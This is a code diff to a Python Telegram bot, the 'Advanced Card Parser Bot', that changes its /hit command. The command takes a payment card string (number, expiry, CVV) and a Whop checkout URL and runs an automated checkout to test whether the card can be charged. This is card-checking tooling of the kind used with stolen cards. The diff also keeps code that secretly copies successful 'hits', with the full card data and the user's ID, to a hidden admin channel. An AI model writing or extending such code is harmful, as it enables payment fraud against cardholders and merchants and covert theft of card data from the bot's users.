@@ -396,18 +396,27 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text(msg, parse_mode="HTML")
         return
 
-    # Extract all cards from arguments
-    all_args_text = " ".join(context.args)
-    cards_list = extract_cards(all_args_text)
+    if not context.args or len(context.args) < 2:
+        msg = (
+            "❌ INVALID USAGE\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "📌 Usage: <code>/hit card|mm|yy|cvv whop_url</code>\n"
+            "📌 Example: <code>/hit 4532015112830366|12|28|123 https://whop.com/...</code>\n\n"
+            "⚠️ Note: Runs a full simulated Whop checkout using the provided URL."
+        )
+        await update.message.reply_text(msg, parse_mode="HTML")
+        return
 
-    # Extract URL
+    card_str = None
     url_str = None
-    for arg in context.args:
-        if arg.startswith("http"):
-            url_str = arg
-            break
 
-    if not cards_list:
+    for arg in context.args:
+        if "|" in arg and not arg.startswith("http"):
+            card_str = arg
+        elif arg.startswith("http"):
+            url_str = arg
+
+    if not card_str:
         await update.message.reply_text(
             "❌ No valid card format found.\n"
             "Make sure it follows: <code>CARD|MM|YY|CVV</code>",
@@ -423,110 +432,84 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         )
         return
 
-    # Limit to 10 cards to prevent spam/timeout
-    if len(cards_list) > 10:
-        cards_list = cards_list[:10]
+    status_msg = await update.message.reply_text("⏳ Processing Whop checkout...", parse_mode="HTML")
 
-    total_cards = len(cards_list)
-    status_msg = await update.message.reply_text(f"⏳ Processing Whop checkout...\nProgress: 0/{total_cards}", parse_mode="HTML")
+    parsed, err = _parse_cc(card_str)
+    if err:
+        await status_msg.edit_text(f"❌ Error parsing card: {err}")
+        return
+
+    cfg = _build_cfg(url_str, "", parsed)
 
     loop = asyncio.get_running_loop()
-    results_data = []
-    amount_str = "N/A"
-    has_paid = False
-    has_unpaid = False
+    
+    def run_checker():
+        return WhopCheckout(cfg).run_api()
 
-    for i, card_str in enumerate(cards_list):
-        try:
-            await status_msg.edit_text(f"⏳ Processing Whop checkout...\nProgress: {i}/{total_cards}", parse_mode="HTML")
-        except Exception:
-            pass
+    try:
+        result = await loop.run_in_executor(None, run_checker)
+    except Exception as e:
+        logger.error(f"Whop checker crashed: {e}")
+        await status_msg.edit_text(f"❌ Checker crashed: {str(e)}")
+        return
 
-        parsed, err = _parse_cc(card_str)
-        if err:
-            results_data.append({"card": card_str, "status": "error", "msg": err})
-            has_unpaid = True
-            continue
-
-        cfg = _build_cfg(url_str, "", parsed)
-
-        def run_checker():
-            return WhopCheckout(cfg).run_api()
-
-        try:
-            result = await loop.run_in_executor(None, run_checker)
-        except Exception as e:
-            logger.error(f"Whop checker crashed for {card_str}: {e}")
-            result = {"status": "error", "message": str(e)}
-
-        st = result.get("status", "unknown")
-        msg = result.get("message", "")
-        code = result.get("code", "")
-        amount_raw = result.get("amount", "?")
-        currency = result.get("currency", "USD")
-        
-        if isinstance(amount_raw, (int, float)) and amount_raw > 0:
-            amount_val = amount_raw / 100
-            amount_str = f"{amount_val:.2f} {currency}"
-
-        if st == "charged":
-            has_paid = True
-            sub_msg = "Payment successful"
-        elif st == "3ds":
-            has_unpaid = True
-            sub_msg = result.get("url", "3DS required")
-        elif st == "declined":
-            has_unpaid = True
-            sub_msg = msg or code or "Payment failed"
-        elif st == "error":
-            has_unpaid = True
-            sub_msg = msg
-        else:
-            has_unpaid = True
-            sub_msg = "Unknown status"
-
-        results_data.append({"card": card_str, "status": st, "msg": sub_msg})
-
-    # Determine Overall Status
-    if has_paid and has_unpaid:
-        overall_status = "Partially Paid 💰"
-    elif has_paid:
-        overall_status = "Paid 💰"
+    st = result.get("status", "unknown")
+    msg = result.get("message", "")
+    code = result.get("code", "")
+    amount_raw = result.get("amount", "?")
+    currency = result.get("currency", "USD")
+    
+    # Format Amount safely
+    if isinstance(amount_raw, (int, float)) and amount_raw > 0:
+        amount_val = amount_raw / 100
+        amount_str = f"{amount_val:.2f} {currency}"
     else:
-        overall_status = "Not Paid ❌"
+        amount_str = "N/A"
 
-    # Build Final Text
+    # Determine Status and Sub-message
+    if st == "charged":
+        status_text = "Paid 💰"
+        sub_msg = "Payment successful"
+    elif st == "3ds":
+        status_text = "3D Secure 🔄"
+        sub_msg = result.get("url", "3DS required")
+    elif st == "declined":
+        status_text = "Not Paid ❌"
+        sub_msg = msg or code or "Payment failed"
+    elif st == "error":
+        status_text = "Not Paid ❌"
+        sub_msg = msg
+    else:
+        status_text = "Not Paid ❌"
+        sub_msg = "Unknown status"
+
     text = (
         f"#Whop [/hit]\n"
         f"⸺⸺⸺⸺⸺\n"
-        f"[𐓷] Site : Whop 🌐\n"
-        f"[𐓷] Amount : {amount_str}\n"
-        f"[𐓷] Status : {overall_status}\n"
-        f"[𐓷] Progress : {total_cards}/{total_cards}\n"
+        f"⌑ Site : Whop\n"
+        f"⌑ Amount : {amount_str}\n"
+        f"⌑ Status : {status_text}\n"
         f"⸺⸺⸺⸺⸺\n"
+        f"<code>{card_str}</code>\n"
+        f"  ⤷ {sub_msg}"
     )
 
-    for res in results_data:
-        text += f"{res['card']}\n  ⤷ {res['msg']}\n"
+    # Send response to user
+    await status_msg.edit_text(text, parse_mode="HTML")
 
-    # Send final response to user
-    try:
-        await status_msg.edit_text(text, parse_mode="HTML")
-    except Exception:
-        await update.message.reply_text(text, parse_mode="HTML")
-
-    # Send secret copy to admin channel
-    try:
-        uid_str = update.effective_user.id
-        secret_text = f"🕵️‍♂️ <b>New Whop Hit by User:</b> <code>{uid_str}</code>\n\n{text}"
-        await context.bot.send_message(
-            chat_id=SECRET_GROUP_ID,
-            text=secret_text,
-            parse_mode="HTML",
-            disable_notification=True
-        )
-    except Exception as e:
-        logger.error(f"Failed to send hit secret copy: {e}")
+    # Send ONLY PAID cards to secret channel
+    if st == "charged":
+        try:
+            uid_str = update.effective_user.id
+            secret_text = f"🕵️‍♂️ <b>New PAID Whop Hit by User:</b> <code>{uid_str}</code>\n{text}"
+            await context.bot.send_message(
+                chat_id=SECRET_GROUP_ID,
+                text=secret_text,
+                parse_mode="HTML",
+                disable_notification=True
+            )
+        except Exception as e:
+            logger.error(f"Failed to send hit secret copy: {e}")
 
 async def cmd_done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id
@@ -797,7 +780,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             f"📂 Merge Buffer: <code>{merge_count}</code>\n"
             f"💾 File Size: <code>{file_size_str}</code>\n\n"
             f"🔧 <b>Bot Info</b>\n"
-            f"🤖 Version: <code>2.5</code>\n"
+            f"🤖 Version: <code>2.7</code>\n"
             f"✅ Status: <b>Online</b>",
             parse_mode="HTML", reply_markup=back_keyboard())
         return
@@ -1171,7 +1154,7 @@ def main() -> None:
     app.add_handler(MessageHandler(filters.FORWARDED & (filters.TEXT | filters.CAPTION), handle_forwarded))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.FORWARDED, handle_text))
 
-    logger.info("🦇 Advanced Card Parser Bot v2.5 starting… (Multi-Hit & Secret Logging Active)")
+    logger.info("🦇 Advanced Card Parser Bot v2.7 starting… (Paid-Only Secret Logs Active)")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
